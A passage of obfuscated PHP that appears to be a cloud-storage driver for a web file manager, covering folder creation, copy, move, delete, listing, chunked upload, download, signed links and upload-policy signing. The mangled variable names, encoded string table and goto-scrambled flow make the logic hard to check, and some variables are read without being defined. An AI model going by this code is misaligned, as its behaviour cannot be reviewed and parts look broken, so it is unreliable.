$bëéÏ¿‘†¥ = '', $dˆ¼èºßÕ = REPEAT_RENAME) { if ($this->setContent($aÉÉÚœ™®†, $bëéÏ¿‘†¥)) { return $this->getPathOuter($aÉÉÚœ™®†); } return !1; } public function mkdir($fš¸«ñç÷ì, $bº†íÃ³¯¢ = REPEAT_SKIP) { $A‡ŸÅ—¶‡ =& $_SERVER[í…¶]; $E“ÎÛ¾¨ÎÚ = trim($fš¸«ñç÷ì, $A‡ŸÅ—¶‡[8]); if ($this->_isFolder($E“ÎÛ¾¨ÎÚ)) { return $this->getPathOuter($E“ÎÛ¾¨ÎÚ); } $DÌë»„®²Æ = array($A‡ŸÅ—¶‡[1245]); $A…èÖÏš¸† = $this->ussRequest($E“ÎÛ¾¨ÎÚ, $A‡ŸÅ—¶‡[212], !1, $DÌë»„®²Æ); return $A…èÖÏš¸†[$A‡ŸÅ—¶‡[1030]] ? $this->getPathOuter($E“ÎÛ¾¨ÎÚ) : !1; } public function copyFile($D¯´ùÆÆ¼õ, $d‡ñÃî‘ß†) { $c¯®¯¡•Ù¦ =& $_SERVER[í…¶]; $E¦¯¸¾ó = array($c¯®¯¡•Ù¦[1246] . "\57{$this->bucket}\57{$D¯´ùÆÆ¼õ}", $c¯®¯¡•Ù¦[1247]); $f¢½¸˜®ä» = $this->ussRequest($d‡ñÃî‘ß†, $c¯®¯¡•Ù¦[214], !1, $E¦¯¸¾ó); return $f¢½¸˜®ä»[$c¯®¯¡•Ù¦[1030]] ? !0 : $this->getPathOuter($d‡ñÃî‘ß†); } public function moveFile($CİèÖ‚Æ÷Í, $Bø™–¿ÁÓÔ) { $båÂ­é®ÒŠ =& $_SERVER[í…¶]; $AÖöîµÒÜ¡ = array($båÂ­é®ÒŠ[1248] . "\57{$this->bucket}\x2f{$CİèÖ‚Æ÷Í}", $båÂ­é®ÒŠ[1247]); $dµ“ï‡Ûàè = $this->ussRequest($Bø™–¿ÁÓÔ, $båÂ­é®ÒŠ[214], !1, $AÖöîµÒÜ¡); return $dµ“ï‡Ûàè[$båÂ­é®ÒŠ[1030]] ? !0 : $this->getPathOuter($Bø™–¿ÁÓÔ); } public function delFile($D„‹´í½À‘) { $B£¼±· =& $_SERVER[í…¶]; $eéäí®È¡ = $this->ussRequest($D„‹´í½À‘, $B£¼±·[1249]); return $eéäí®È¡[$B£¼±·[1030]] ? !0 : !1; } public function delFolder($bö¬™Õ±êí) { $CŸ«³‹ ›Á =& $_SERVER[í…¶]; $dÀ®¡Õìã‚ = $this->listAll($bö¬™Õ±êí); krsort($dÀ®¡Õìã‚); foreach ($dÀ®¡Õìã‚ as $B½‹¥Âß‰) { $this->ussRequest($B½‹¥Âß‰[$CŸ«³‹ ›Á[75]], $CŸ«³‹ ›Á[1249]); } return $this->ussRequest($bö¬™Õ±êí, $CŸ«³‹ ›Á[1249]); } public function rename($eÆ–ŸÕÀöÇ, $Aõ¹ÕÈÏƒ”) { if ($this->isFile($eÆ–ŸÕÀöÇ)) { $Aõ¹ÕÈÏƒ” = get_path_father($eÆ–ŸÕÀöÇ) . $Aõ¹ÕÈÏƒ”; return $this->moveFile($eÆ–ŸÕÀöÇ, $Aõ¹ÕÈÏƒ”); } return $this->renameObject($eÆ–ŸÕÀöÇ, $Aõ¹ÕÈÏƒ”); } public function fileInfo($F¹¨˜ÉêÇø, $aõ”’‡‹´Ç = false, $A­ˆÊËåàÊ = array()) { $B“ŒÉÍ’Å =& $_SERVER[í…¶]; if ($aõ”’‡‹´Ç) { return array($B“ŒÉÍ’Å[28] => $this->pathThis($F¹¨˜ÉêÇø), $B“ŒÉÍ’Å[75] => $this->getPathOuter($B“ŒÉÍ’Å[8] . $F¹¨˜ÉêÇø), $B“ŒÉÍ’Å[29] => $B“ŒÉÍ’Å[167], $B“ŒÉÍ’Å[77] => isset($A­ˆÊËåàÊ[$B“ŒÉÍ’Å[325]]) ? $A­ˆÊËåàÊ[$B“ŒÉÍ’Å[325]] : 0, $B“ŒÉÍ’Å[160] => $this->ext($F¹¨˜ÉêÇø)); } $B½—¶¼º½ƒ = array($B“ŒÉÍ’Å[28] => $this->pathThis($F¹¨˜ÉêÇø), $B“ŒÉÍ’Å[75] => $this->getPathOuter($B“ŒÉÍ’Å[8] . $F¹¨˜ÉêÇø), $B“ŒÉÍ’Å[29] => $B“ŒÉÍ’Å[167], $B“ŒÉÍ’Å[187] => 0, $B“ŒÉÍ’Å[107] => isset($aÑ³…éÍˆŒ[$B“ŒÉÍ’Å[1250]]) ? $aÑ³…éÍˆŒ[$B“ŒÉÍ’Å[1250]] : 0, $B“ŒÉÍ’Å[77] => isset($A­ˆÊËåàÊ[$B“ŒÉÍ’Å[325]]) ? $A­ˆÊËåàÊ[$B“ŒÉÍ’Å[325]] : 0, $B“ŒÉÍ’Å[160] => $this->ext($F¹¨˜ÉêÇø), $B“ŒÉÍ’Å[188] => !0, $B“ŒÉÍ’Å[189] => !0); if (empty($A­ˆÊËåàÊ)) { $A­ˆÊËåàÊ = $this->objectMeta($F¹¨˜ÉêÇø); if (!$A­ˆÊËåàÊ) { return $B½—¶¼º½ƒ; } $B½—¶¼º½ƒ[$B“ŒÉÍ’Å[187]] = $A­ˆÊËåàÊ[$B“ŒÉÍ’Å[1251]]; $B½—¶¼º½ƒ[$B“ŒÉÍ’Å[107]] = $A­ˆÊËåàÊ[$B“ŒÉÍ’Å[1252]]; $B½—¶¼º½ƒ[$B“ŒÉÍ’Å[77]] = $A­ˆÊËåàÊ[$B“ŒÉÍ’Å[77]]; } return $B½—¶¼º½ƒ; } public function folderInfo($C¢ğï³‰÷À, $BÈ«…¿… = false) { $C…Õ‹–íµ =& $_SERVER[í…¶]; if ($BÈ«…¿…) { return array($C…Õ‹–íµ[28] => $this->pathThis($C¢ğï³‰÷À), $C…Õ‹–íµ[75] => $this->getPathOuter($C…Õ‹–íµ[8] . $C¢ğï³‰÷À), $C…Õ‹–íµ[29] => $C…Õ‹–íµ[76]); } $c‘÷Àˆöë = array($C…Õ‹–íµ[28] => $this->pathThis($C¢ğï³‰÷À), $C…Õ‹–íµ[75] => $this->getPathOuter($C…Õ‹–íµ[8] . $C¢ğï³‰÷À), $C…Õ‹–íµ[29] => $C…Õ‹–íµ[76], $C…Õ‹–íµ[187] => 0, $C…Õ‹–íµ[107] => isset($b¬é¥èÍßÅ[$C…Õ‹–íµ[1250]]) ? $b¬é¥èÍßÅ[$C…Õ‹–íµ[1250]] : 0, $C…Õ‹–íµ[1160] => !0, $C…Õ‹–íµ[1161] => !0); if (empty($e¼é”ôà)) { $e¼é”ôà = $this->objectMeta($C¢ğï³‰÷À); if (!$e¼é”ôà) { return $c‘÷Àˆöë; } $c‘÷Àˆöë[$C…Õ‹–íµ[187]] = $e¼é”ôà[$C…Õ‹–íµ[1251]]; $c‘÷Àˆöë[$C…Õ‹–íµ[107]] = $e¼é”ôà[$C…Õ‹–íµ[1252]]; } return $c‘÷Àˆöë; } private function fileList($e§ØÄ½¦¯ƒ, $A¨¾œËÓÃ‹ = 0, $dÜæ¬é›èÜ = 1000) { $e½ÓŠç¾Øˆ =& $_SERVER[í…¶]; $FÚ¦çğ«„ƒ = array($e½ÓŠç¾Øˆ[1253], $e½ÓŠç¾Øˆ[1254] . $dÜæ¬é›èÜ); if ($A¨¾œËÓÃ‹) { $FÚ¦çğ«„ƒ[] = $e½ÓŠç¾Øˆ[1255] . $A¨¾œËÓÃ‹; } $cÓ‰»Æ›œ = $this->ussRequest($e§ØÄ½¦¯ƒ, $e½ÓŠç¾Øˆ[216], !1, $FÚ¦çğ«„ƒ); return !$cÓ‰»Æ›œ[$e½ÓŠç¾Øˆ[1030]] ? !1 : $cÓ‰»Æ›œ[$e½ÓŠç¾Øˆ[1032]]; } public function listPath($F«ç™Š¨’¨, $DÃ‡¤ÎÏøÙ = false) { goto A¸Çƒ¹—Ø‹; f¾­Ì„ñ£•: $bëîÓ‹¥ = $C¥¨åˆµ¢Ö = array(); $Dµ»‰ƒÔá· = rtrim($F«ç™Š¨’¨, $fìˆè”²¢„[8]) . $fìˆè”²¢„[8]; while (!0) { $F½‰¸Êß¶ = $this->fileList($F«ç™Š¨’¨, $c¡·èîÍÛî, $A¶º’ÕÍËï); if (!$F½‰¸Êß¶) { return !1; } $c¡·èîÍÛî = isset($F½‰¸Êß¶[$fìˆè”²¢„[1256]]) ? $F½‰¸Êß¶[$fìˆè”²¢„[1256]] : $fìˆè”²¢„[33]; $A ãÇšÓ = isset($F½‰¸Êß¶[$fìˆè”²¢„[1257]]) ? $F½‰¸Êß¶[$fìˆè”²¢„[1257]] : array(); foreach ($A ãÇšÓ as $B³ğŠ³ôª¹) { if ($B³ğŠ³ôª¹[$fìˆè”²¢„[29]] == $fìˆè”²¢„[76]) { $bëîÓ‹¥[] = $this->folderInfo($Dµ»‰ƒÔá· . $B³ğŠ³ôª¹[$fìˆè”²¢„[28]], $DÃ‡¤ÎÏøÙ, $B³ğŠ³ôª¹); } else { $C¥¨åˆµ¢Ö[] = $this->fileInfo($Dµ»‰ƒÔá· . $B³ğŠ³ôª¹[$fìˆè”²¢„[28]], $DÃ‡¤ÎÏøÙ, $B³ğŠ³ôª¹); } } if (count($A ãÇšÓ) < $A¶º’ÕÍËï) { break; } } goto EòÍÍ³É†; A¸Çƒ¹—Ø‹: $fìˆè”²¢„ =& $_SERVER[í…¶]; $c¡·èîÍÛî = $fìˆè”²¢„[33]; $A¶º’ÕÍËï = 1000; goto f¾­Ì„ñ£•; EòÍÍ³É†: return array($fìˆè”²¢„[74] => $bëîÓ‹¥, $fìˆè”²¢„[73] => $C¥¨åˆµ¢Ö); goto Ašóºéô˜¥; Ašóºéô˜¥: } private function recursionAllFiles($b—¾Í‚š°·, &$E˜àÅœØÙ—) { $bÀİ±‚ ôŒ =& $_SERVER[í…¶]; $cÔù…•ñÒ¤ = $bÀİ±‚ ôŒ[33]; $bÏ±àøÃªâ = 1000; $bš¥ «¡æ = $AĞË†æÃŒ¿ = array(); $b›‚‰Ê‘¯ = rtrim($b—¾Í‚š°·, $bÀİ±‚ ôŒ[8]) . $bÀİ±‚ ôŒ[8]; while (!0) { $eƒ‹‹˜ç°è = $this->fileList($b—¾Í‚š°·, $cÔù…•ñÒ¤, $bÏ±àøÃªâ); if (!$eƒ‹‹˜ç°è) { return !1; } $cÔù…•ñÒ¤ = isset($eƒ‹‹˜ç°è[$bÀİ±‚ ôŒ[1256]]) ? $eƒ‹‹˜ç°è[$bÀİ±‚ ôŒ[1256]] : $bÀİ±‚ ôŒ[33]; $aİãÅï¥ç‘ = isset($eƒ‹‹˜ç°è[$bÀİ±‚ ôŒ[1257]]) ? $eƒ‹‹˜ç°è[$bÀİ±‚ ôŒ[1257]] : array(); foreach ($aİãÅï¥ç‘ as $Aù”¼Ñ¼…) { $E¢Ãùö¼ = array($bÀİ±‚ ôŒ[75] => $b›‚‰Ê‘¯ . $Aù”¼Ñ¼…[$bÀİ±‚ ôŒ[28]], $bÀİ±‚ ôŒ[76] => $Aù”¼Ñ¼…[$bÀİ±‚ ôŒ[29]] == $bÀİ±‚ ôŒ[76] ? 1 : 0, $bÀİ±‚ ôŒ[77] => isset($Aù”¼Ñ¼…[$bÀİ±‚ ôŒ[325]]) ? $Aù”¼Ñ¼…[$bÀİ±‚ ôŒ[325]] : 0); $E˜àÅœØÙ—[] = $E¢Ãùö¼; if ($E¢Ãùö¼[$bÀİ±‚ ôŒ[76]] == 1) { $this->recursionAllFiles($E¢Ãùö¼[$bÀİ±‚ ôŒ[75]], $E˜àÅœØÙ—); } } if (count($aİãÅï¥ç‘) < $bÏ±àøÃªâ) { break; } } } public function has($e£Ë–… á—, $dÒ¯ˆ®’„ = false, $eğÏ§²²ß = true) { goto Cø‚ÕääóŠ; böìÇÅ‚ÅÛ: while (!0) { $a±‹‘¤Ì¬ = $this->fileList($e£Ë–… á—, $CëŒÓ„”Ü, $C–Ãš”–²); if (!$a±‹‘¤Ì¬) { return !1; } $CëŒÓ„”Ü = isset($a±‹‘¤Ì¬[$CÍÄåƒ•Ê[1256]]) ? $a±‹‘¤Ì¬[$CÍÄåƒ•Ê[1256]] : $CÍÄåƒ•Ê[33]; $CíÎ „¶˜Á = isset($a±‹‘¤Ì¬[$CÍÄåƒ•Ê[1257]]) ? $a±‹‘¤Ì¬[$CÍÄåƒ•Ê[1257]] : array(); if (empty($CíÎ „¶˜Á)) { break; } $dÔã¤§¸£® = array_to_keyvalue($CíÎ „¶˜Á, $CÍÄåƒ•Ê[33], $CÍÄåƒ•Ê[29]); $aå¤ÖÂšİŒ = array_count_values($dÔã¤§¸£®); $FáàÔä½ß« = isset($aå¤ÖÂšİŒ[$CÍÄåƒ•Ê[76]]) ? $aå¤ÖÂšİŒ[$CÍÄåƒ•Ê[76]] : 0; $cùÄÑŒâ÷Ÿ = count($dÔã¤§¸£®) - $FáàÔä½ß«; if ($dÒ¯ˆ®’„) { $BíˆçÍÑã += $FáàÔä½ß«; $f µ×±¶ += $cùÄÑŒâ÷Ÿ; if ($dÄß²çí‡‹ < $C–Ãš”–²) { break; } continue; } if ($eğÏ§²²ß) { if ($cùÄÑŒâ÷Ÿ) { return !0; } } else { if ($FáàÔä½ß«) { return !0; } } if (count($CíÎ „¶˜Á) < $C–Ãš”–²) { break; } } if ($dÒ¯ˆ®’„) { return array($CÍÄåƒ•Ê[191] => $f µ×±¶, $CÍÄåƒ•Ê[192] => $BíˆçÍÑã); } return !1; goto DÁé†±ßœÑ; F‹’Í“İÊ: $f µ×±¶ = 0; $BíˆçÍÑã = 0; $d«ù×ÎÈŠæ = rtrim($e£Ë–… á—, $CÍÄåƒ•Ê[8]) . $CÍÄåƒ•Ê[8]; goto böìÇÅ‚ÅÛ; Cø‚ÕääóŠ: $CÍÄåƒ•Ê =& $_SERVER[í…¶]; $CëŒÓ„”Ü = $CÍÄåƒ•Ê[33]; $C–Ãš”–² = 1000; goto F‹’Í“İÊ; DÁé†±ßœÑ: } public function listAll($A—ƒ‘’µÑÙ) { $A—¿·‡ãĞ = array(); $this->recursionAllFiles($A—ƒ‘’µÑÙ, $A—¿·‡ãĞ); return $A—¿·‡ãĞ; } public function canRead($AÍ¾¾Ê) { return $this->exist($AÍ¾¾Ê) ? !0 : !1; } public function canWrite($eÀéà­è¸É) { return $this->exist($eÀéà­è¸É) ? !0 : !1; } public function getContent($AÉ«ºâß÷) { return $this->fileSubstr($AÉ«ºâß÷, 0, -1); } public function setContent($EÉ¤…ÍÍë†, $cŒŒ›İ†Ü“ = '') { $Aùâ³×õ›ğ =& $_SERVER[í…¶]; if (!$cŒŒ›İ†Ü“) { $C™Ã¤‡¶òæ = $this->ussRequest($EÉ¤…ÍÍë†, $Aùâ³×õ›ğ[212]); return $C™Ã¤‡¶òæ[$Aùâ³×õ›ğ[1030]]; } $e‰‰õ¹Ó£¢ = $this->tempFile($this->pathThis($EÉ¤…ÍÍë†)); file_put_contents($e‰‰õ¹Ó£¢, $cŒŒ›İ†Ü“); if ($this->upload($EÉ¤…ÍÍë†, $e‰‰õ¹Ó£¢)) { $this->tempFileRemve($e‰‰õ¹Ó£¢); return !0; } return !1; } public function fileSubstr($Dî„©Á²‹‡, $CÏ¿œÅœ‰î, $dĞÏó›í¤ó) { $dÀÃ‚ó‘© =& $_SERVER[í…¶]; if (!($a…ù¼£¤“ˆ = $this->link($Dî„©Á²‹‡))) { return !1; } $fÈœ¢æÃ†Ä = !1; if ($dĞÏó›í¤ó > 0) { $eŠĞ‹«‘º´ = $CÏ¿œÅœ‰î + $dĞÏó›í¤ó - 1; $fÈœ¢æÃ†Ä = array($dÀÃ‚ó‘©[1218] . $CÏ¿œÅœ‰î . $dÀÃ‚ó‘©[421] . $eŠĞ‹«‘º´); } $BƒÎÈòëËŒ = url_request($a…ù¼£¤“ˆ, $dÀÃ‚ó‘©[216], !1, $fÈœ¢æÃ†Ä); return $BƒÎÈòëËŒ[$dÀÃ‚ó‘©[691]] ? $BƒÎÈòëËŒ[$dÀÃ‚ó‘©[1032]] : !1; } public function upload($CôÌùè…„š, $D„ÓçÊéæË, $dëÀ³„î”ù = false, $Aá©ğ„‹¡ = REPEAT_REPLACE) { goto bæÈˆíäÈ„; E¢«¢ÕÛç: if (!$c¯¡·ÌäèË[$EĞ‰«Ë†[1030]]) { return !1; } $F‰ù‘Îáì = $c¯¡·ÌäèË[$EĞ‰«Ë†[1032]]; $Dâ‹¾¸¨÷ = 0; goto Eç‹ïŒ£‘±; d‰®™À‚ç›: $c¯¡·ÌäèË = $this->ussRequest($CôÌùè…„š, $EĞ‰«Ë†[214], !1, $d¾Üî’º±); return $c¯¡·ÌäèË[$EĞ‰«Ë†[1030]] ? $this->getPathOuter($B—Ñ‚íÆê) : !1; goto CÖõÍ˜¾„ğ; bæÈˆíäÈ„: $EĞ‰«Ë† =& $_SERVER[í…¶]; $EÅ–Ï¼¬ÚÚ = IO::size($D„ÓçÊéæË); if ($EÅ–Ï¼¬ÚÚ <= 1024 * 1024 * 200) { $B˜³ÕÖÃÁ = array($EĞ‰«Ë†[1258] . $D„ÓçÊéæË); $c¯¡·ÌäèË = $this->ussRequest($CôÌùè…„š, $EĞ‰«Ë†[214], $B˜³ÕÖÃÁ); return $c¯¡·ÌäèË[$EĞ‰«Ë†[1030]] ? $this->getPathOuter($CôÌùè…„š) : !1; } goto aÏÕ¤ºÎ†; Eç‹ïŒ£‘±: $EÙˆ¡‘ÃàÓ = $F‰ù‘Îáì[$EĞ‰«Ë†[1263]]; $a‹ÖØ³ßˆ¤ = fopen($D„ÓçÊéæË, $EĞ‰«Ë†[1168]); if (!$a‹ÖØ³ßˆ¤) { return !1; } goto eàŸßŒçŞ¿; eàŸßŒçŞ¿: do { $D©¥ÑÇØÂÒ = $F‰ù‘Îáì[$EĞ‰«Ë†[1264]]; fseek($a‹ÖØ³ßˆ¤, $Dâ‹¾¸¨÷); $f¿âŞÖ–ªï = fread($a‹ÖØ³ßˆ¤, $D©¥ÑÇØÂÒ); $DÊ•íêÌ¾ = 0; do { $DÊ•íêÌ¾++; $F‰ù‘Îáì = $this->uploadPart($CôÌùè…„š, $F‰ù‘Îáì, $f¿âŞÖ–ªï); } while (!$F‰ù‘Îáì && $DÊ•íêÌ¾ < 3); if (!$F‰ù‘Îáì) { return !1; } $EÙˆ¡‘ÃàÓ = $F‰ù‘Îáì[$EĞ‰«Ë†[1263]]; $Dâ‹¾¸¨÷ += $D©¥ÑÇØÂÒ; } while ($EÙˆ¡‘ÃàÓ != -1); fclose($a‹ÖØ³ßˆ¤); $d¾Üî’º± = array($EĞ‰«Ë†[1265], $EĞ‰«Ë†[1266] . $F‰ù‘Îáì[$EĞ‰«Ë†[1267]], $EĞ‰«Ë†[1261]); goto d‰®™À‚ç›; aÏÕ¤ºÎ†: $e‘¿õ¬¨Û = 1024 * 1024 * 10; $d¾Üî’º± = array($EĞ‰«Ë†[1259], $EĞ‰«Ë†[1260] . $EÅ–Ï¼¬ÚÚ, $EĞ‰«Ë†[1261], $EĞ‰«Ë†[1262] . $e‘¿õ¬¨Û); $c¯¡·ÌäèË = $this->ussRequest($CôÌùè…„š, $EĞ‰«Ë†[214], !1, $d¾Üî’º±); goto E¢«¢ÕÛç; CÖõÍ˜¾„ğ: } private function uploadPart($DÒ‡¯˜§Ä, $DáÙ˜œÈ, &$A‡¦¯Úö¸‘) { $b¹Š¿µÅ™ =& $_SERVER[í…¶]; $d´ˆ¸ô« = array($b¹Š¿µÅ™[1268], $b¹Š¿µÅ™[1266] . $DáÙ˜œÈ[$b¹Š¿µÅ™[1267]], $b¹Š¿µÅ™[1269] . $DáÙ˜œÈ[$b¹Š¿µÅ™[1263]], $b¹Š¿µÅ™[138] . $DáÙ˜œÈ[$b¹Š¿µÅ™[1264]]); $EÌ­é¾ğšù = $this->ussRequest($DÒ‡¯˜§Ä, $b¹Š¿µÅ™[214], $A‡¦¯Úö¸‘, $d´ˆ¸ô«); return !$EÌ­é¾ğšù[$b¹Š¿µÅ™[1030]] ? $EÌ­é¾ğšù[$b¹Š¿µÅ™[1030]] : $EÌ­é¾ğšù[$b¹Š¿µÅ™[1032]]; } public function uploadFormData($aµïò¬Š¸î, $AÖ§¾‡ = 3600) { return $this->uploadPolicy($aµïò¬Š¸î, $AÖ§¾‡); } public function multiUploadFormData($FçŞÉÓ«é¦, $eóÅÏÆİˆ = 3600) { $D·ì²Ú¢„‘ =& $_SERVER[í…¶]; $a£ÊÌáÓ›à = (int) $GLOBALS[$D·ì²Ú¢„‘[7]][$D·ì²Ú¢„‘[77]]; return $this->uploadPolicy($FçŞÉÓ«é¦, $eóÅÏÆİˆ, $a£ÊÌáÓ›à); } private function uploadPolicy($d¶À˜ƒµô, $b…ŸËŸ½Æ„ = 3600, $b…º…ÓçéŞ = 0) { goto E†¤æ´­è¾; D«òß»¢¬¯: $DôÓ£ğÄÁ = array($d‘½Ò¢…¿¶[1270] => $this->bucket, $d‘½Ò¢…¿¶[1271] => $d¶À˜ƒµô, $d‘½Ò¢…¿¶[1272] => time() + $b…ŸËŸ½Æ„, $d‘½Ò¢…¿¶[1273] => $eó‡õ˜¬ÀÑ); if ($b…º…ÓçéŞ) { $DôÓ£ğÄÁ[$d‘½Ò¢…¿¶[1189]] = $b…º…ÓçéŞ; } $D™§İµëñ¦ = base64_encode(json_encode($DôÓ£ğÄÁ)); goto d®™‰åšğá; d®™‰åšğá: $b‘»±òÂŒ = base64_encode(hash_hmac($d‘½Ò¢…¿¶[1240], "\120\117\x53\124\46{$B²×²†Ø‹}\x26{$eó‡õ˜¬ÀÑ}\46{$D™§İµëñ¦}", md5("{$this->userpass}"), !0)); $AÃæáÔÃÖÇ = array($d‘½Ò¢…¿¶[1110] => $D™§İµëñ¦, $d‘½Ò¢…¿¶[1274] => "\125\120\x59\x55\x4e\40{$this->username}\72{$b‘»±òÂŒ}", $d‘½Ò¢…¿¶[169] => $this->endpoint . $B²×²†Ø‹); return $AÃæáÔÃÖÇ; goto e¾³ã¼×‰ˆ; E†¤æ´­è¾: $d‘½Ò¢…¿¶ =& $_SERVER[í…¶]; $B²×²†Ø‹ = $d‘½Ò¢…¿¶[8] . $this->bucket; $eó‡õ˜¬ÀÑ = gmdate($d‘½Ò¢…¿¶[1203]); goto D«òß»¢¬¯; e¾³ã¼×‰ˆ: } public function download($D­Ğ„¯®‡, $Dã§”“ªÁ·) { goto b‰»ËÊª¬º; bËÔ÷¤µÃÇ: fclose($cÌíÊÁî„Œ); return $Dã§”“ªÁ·; goto b¶ˆù¬‘¢; b‰»ËÊª¬º: $Dàà”º·¸— = IO::getPathInner(IO::mkfile($Dã§”“ªÁ·)); if (!($bâÇª‡¼ÃÛ = $this->link($D­Ğ„¯®‡))) { return !1; } $E‚‡ŸÉ¾‰— = 0; goto FãÈ–Ÿ“Öµ; FãÈ–Ÿ“Öµ: $b¦‰Î÷ÎÅç = 1024 * 200; $cÌíÊÁî„Œ = fopen($Dàà”º·¸—, $_SERVER[í…¶][1224]); while (!0) { $Fî„Á†°° = $this->fileSubstr($D­Ğ„¯®‡, $E‚‡ŸÉ¾‰—, $b¦‰Î÷ÎÅç); if ($Fî„Á†°° === !1) { return !1; } fwrite($cÌíÊÁî„Œ, $Fî„Á†°°); $E‚‡ŸÉ¾‰— += $b¦‰Î÷ÎÅç; if (strlen($Fî„Á†°°) < $b¦‰Î÷ÎÅç) { break; } } goto bËÔ÷¤µÃÇ; b¶ˆù¬‘¢: } public function link($DØ«­Ä¼»ø, $fö«ˆÆİè = array()) { $f¨µ·Ì‰ =& $_SERVER[í…¶]; $DØ«­Ä¼»ø = trim($DØ«­Ä¼»ø, $f¨µ·Ì‰[8]); if (!empty($this->token)) { $Dˆ²çÈøóï = strtotime(date($f¨µ·Ì‰[1275])); $Eñˆœç³ˆÀ = substr(md5($this->token . $f¨µ·Ì‰[272] . $Dˆ²çÈøóï . $f¨µ·Ì‰[1276] . $DØ«­Ä¼»ø), 12, 8) . $Dˆ²çÈøóï; $fö«ˆÆİè[] = $f¨µ·Ì‰[1277] . $Eñˆœç³ˆÀ; } $eâ–´©³ğä = !empty($fö«ˆÆİè) ? $f¨µ·Ì‰[69] . implode($f¨µ·Ì‰[272], $fö«ˆÆİè) : $f¨µ·Ì‰[33]; return $this->getHost() . $f¨µ·Ì‰[8] . $DØ«­Ä¼»ø . $eâ–´©³ğä; } public function fileOut($f‰’ÁØ…Ã, $EŠĞÔªøœ = false, $D‹¦×ÄÒÅò = false, $B›‘ª„¿Å = '') { if (!$D‹¦×ÄÒÅò) { $D‹¦×ÄÒÅò = $this->pathThis($f‰’ÁØ…Ã); } $AÜ“£Û² = $EŠĞÔªøœ ? array($_SERVER[í…¶][1278] . rawurlencode($D‹¦×ÄÒÅò)) : array(); $cß†‘ÕŞïĞ = $this->link($f‰’ÁØ…Ã, $AÜ“£Û²); $this->fileOutLink($cß†‘ÕŞïĞ); } public function fileOutServer($cÊë·Å£ò›, $AŸæÑÓ¡ˆ¡ = false, $FÅéŠŞ«È = false, $a¿¶ë°•ì¥ = '') { parent::fileOut($cÊë·Å£ò›, $AŸæÑÓ¡ˆ¡, $FÅéŠŞ«È, $a¿¶ë°•ì¥); } public function fileOutImage($A±âç‹šçÑ, $D•Ğ„‡ïßÊ = 250) { $B®·¨ÚÜî = $this->link($A±âç‹šçÑ . $_SERVER[í…¶][1279] . $D•Ğ„‡ïßÊ); $this->fileOutLink($B®·¨ÚÜî); } public function fileOutImageServer($Cè‘Áä†š×, $aÀËĞ¶Ùˆ = 250) { parent::fileOutImage($Cè‘Áä†š×, $aÀËĞ¶Ùˆ); } public function hashMd5($bàß¨²šÇ) { $AÁ‚Í»¤ÅÒ =& $_SERVER[í…¶]; $EÀ™Û±»ø¹ = $this->objectMeta($bàß¨²šÇ); return isset($EÀ™Û±»ø¹[$AÁ‚Í»¤ÅÒ[196]]) ? $EÀ™Û±»ø¹[$AÁ‚Í»¤ÅÒ[196]] : !1; } public function size($FîÖÃÁÀö) { $dÃÇ„º®± = $this->objectMeta($FîÖÃÁÀö); return $dÃÇ„º®± ? $dÃÇ„º®±[$_SERVER[í…¶][77]] : 0; } public function info($bå± Ç¤Ÿš) { if ($this->isFolder($bå± Ç¤Ÿš)) { return $this->folderInfo($bå± Ç¤Ÿš); } else { if ($this->isFile($bå± Ç¤Ÿš)) { return $this->fileInfo($bå± Ç¤Ÿš); } } return !1; } public function exist($f©›ñ‰åĞâ) { return $this->isFile($f©›ñ‰åĞâ) || $this->isFolder($f©›ñ‰åĞâ); } public function isFile($a¾³‰‚å¼£) { return !$this->isFolder($a¾³‰‚å¼£) && $this->objectMeta($a¾³‰‚å¼£); } public function isFolder($fŠî÷İ³²õ) { return $this->cacheMethod($_SERVER[í…¶][223], $fŠî÷İ³²õ); } protected function objectMeta($d¸š˜æÚ®‰) { return $this->cacheMethod($_SERVER[í…¶][224], $d¸š˜æÚ®‰); } protected function _objectMeta($E„šÆïğ) { goto EİÆ‚ÆÜÔ; a¸‰©ÄÛ¯Ô: if (!$F£á¢»ËÎ×[$FˆËÓëè¾Ò[1030]]) { return null; } $dÅÌ›É‡õ = isset($F£á¢»ËÎ×[$FˆËÓëè¾Ò[1032]]) ? $F£á¢»ËÎ×[$FˆËÓëè¾Ò[1032]] : array(); if (!isset($dÅÌ›É‡õ[$FˆËÓëè¾Ò[1281]])) { return null; } goto e¥‚¥Ô·; EİÆ‚ÆÜÔ: $FˆËÓëè¾Ò =& $_SERVER[í…¶]; if ($E„šÆïğ == $FˆËÓëè¾Ò[33] || $E„šÆïğ == $FˆËÓëè¾Ò[8]) { return array(); } $F£á¢»ËÎ× = $this->ussRequest($E„šÆïğ, $FˆËÓëè¾Ò[1280]); goto a¸‰©ÄÛ¯Ô; e¥‚¥Ô·: $A¬Ç¼İ÷É = array($FˆËÓëè¾Ò[28] => get_path_this($E„šÆïğ), $FˆËÓëè¾Ò[29] => isset($dÅÌ›É‡õ[$FˆËÓëè¾Ò[1281]]) ? $dÅÌ›É‡õ[$FˆËÓëè¾Ò[1281]] : null, $FˆËÓëè¾Ò[77] => isset($dÅÌ›É‡õ[$FˆËÓëè¾Ò[1282]]) ? $dÅÌ›É‡õ[$FˆËÓëè¾Ò[1282]] : null, $FˆËÓëè¾Ò[196] => isset($dÅÌ›É‡õ[$FˆËÓëè¾Ò[1283]]) ? $dÅÌ›É‡õ[$FˆËÓëè¾Ò[1283]] : null, $FˆËÓëè¾Ò[1251] => isset($dÅÌ›É‡õ[$FˆËÓëè¾Ò[1284]]) ? $dÅÌ›É‡õ[$FˆËÓëè¾Ò[1284]] : null); $A¬Ç¼İ÷É[$FˆËÓëè¾Ò[1252]] = isset($dÅÌ›É‡õ[$FˆËÓëè¾Ò[1285]]) ? strtotime($dÅÌ›É‡õ[$FˆËÓëè¾Ò[1285]]) : $A¬Ç¼İ÷É[$FˆËÓëè¾Ò[1251]]; return $A¬Ç¼İ÷É; goto aÜ³·àÙ¸É; aÜ³·àÙ¸É: } protected function _isFolder($A¶Á››ÑÉä) { $Dæì­¢—Å„ =& $_SERVER[í…¶]; if ($A¶Á››ÑÉä == $Dæì­¢—Å„[33] || $A¶Á››ÑÉä == $Dæì­¢—Å„[8]) { return !0; } $CÉ“–ååŠ = $this->objectMeta($A¶Á››ÑÉä); return isset($CÉ“–ååŠ[$Dæì­¢—Å„[29]]) && $CÉ“–ååŠ[$Dæì­¢—Å„[29]] == $Dæì­¢—Å„[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($fÌ–¼³±¡¶ = false) { } public function exist($a¡äÚ¸ô§“) { $a‡÷İˆª’ = $this->info($a¡äÚ¸ô§“); return 